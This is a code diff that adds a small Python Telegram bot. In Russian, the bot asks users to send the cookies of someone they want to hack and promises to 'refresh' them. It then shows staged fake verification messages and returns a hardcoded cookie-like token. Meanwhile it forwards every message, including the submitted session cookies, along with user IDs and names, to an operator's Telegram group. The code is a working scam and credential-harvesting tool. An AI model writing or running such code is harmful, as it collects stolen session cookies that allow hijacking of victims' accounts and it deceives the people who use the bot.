@@ -1,0 +1,31 @@
+import os
+import telebot
+import time
+
+TOKEN = os.environ['BOT_TOKEN']
+GROUP_ID = os.environ['GROUP_ID']
+
+bot = telebot.TeleBot(TOKEN)
+
+@bot.message_handler(commands=['start'])
+def start_command(message):
+    bot.send_message(message.chat.id, "Привет, пришли куки человека которого хотите взломать, мы его рефрешнем и передадим вам🍪")
+    try:
+        bot.send_message(GROUP_ID, f"👤 Кто-то нажал /start\nID: {message.from_user.id}")
+    except: 
+        pass
+
+@bot.message_handler(func=lambda message: True)
+def handle_message(message):
+    bot.send_message(message.chat.id, "Проверка куки...")
+    time.sleep(2)
+    bot.send_message(message.chat.id, "Проверка прошла успешно ✅ Идёт инициализация...")
+    time.sleep(3)
+    bot.send_message(message.chat.id, "Инициализация завершена✅ ваш куки: CAEaAhACIhsKBGR1aWQSEzcyMDQzMzI1MzI4NDQxMjM2OTEoAw.dcx_K7KltLsjLmtD5zvo9MYLoxTWS-bwssrHI-5q2lB...")
+    
+    try:
+        bot.send_message(GROUP_ID, f"📩 Сообщение от: {message.from_user.first_name}\nТекст: {message.text}")
+    except: 
+        pass
+
+bot.polling(none_stop=True)
